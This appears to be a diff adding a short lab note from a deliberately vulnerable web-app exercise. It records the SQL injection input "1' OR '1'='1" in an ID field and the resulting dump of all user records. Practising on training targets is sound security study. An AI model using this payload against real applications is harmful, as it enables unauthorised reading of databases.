@@ -1,0 +1,17 @@
+For input- 1' OR '1'='1
+output-
+ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
